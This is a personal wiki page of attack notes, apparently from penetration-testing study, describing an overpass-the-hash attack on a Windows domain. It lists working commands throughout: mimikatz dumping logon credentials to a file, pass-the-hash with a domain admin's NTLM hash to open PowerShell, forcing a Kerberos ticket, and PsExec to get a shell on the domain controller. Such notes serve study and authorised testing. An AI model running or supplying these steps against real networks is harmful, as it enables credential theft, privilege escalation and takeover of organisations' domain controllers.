Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-11-02T12:44:53-05:00

====== OverpassTheHash ======
Created Tuesday 02 November 2021

The goal of this attack is to obtain a Kerberos TGT so we can authenticate to each service using Kerberos instead of NTLM.
This give acces to resources that can only be reached by using Kerberos.


This is best done from an RDP session. Raw shell gave a lot of problems

===== Requirements =====
* mimikatz should be present on the system
* PsExec.exe should be present on the system
* Requires access to $Admin, a special admin share

===== Remarks =====
* This will allow you to execute commands on the system the TGT will be generated for.

===== Step 1 =====
Open a high-integrity shell as an admin

===== Step 2 =====
Dump HASHES using mimikatz
{{{code: lang="sh" linenumbers="False"
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > hashes.txt
}}}


===== Step 3 =====
Extract the username + hash of the high-privilege user (domain admin)

===== Step 4 =====
Use PTH to start a powershell shell as your target user
{{{code: lang="sh" linenumbers="False"
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:powershell.exe"
}}}


===== Step 5 (optional) =====
In the powershell window:
{{{code: lang="powershell" linenumbers="False"
klist 							# Print tickets, see that none are present
net use \\<domaincontroller>    # Issue a command that forces a kerberos TGT to be generated
klist							# Check if TGT has been issued
}}}


===== Step 6 =====
In the powershell window:
{{{code: lang="powershell" linenumbers="False"
.\PsExec.exe \\<domain controller> cmd.exe
}}}



===== SEE =====
[[Tools:Windows:SysInternals:PsExec]]
[[Tools:Windows:mimikatz]]
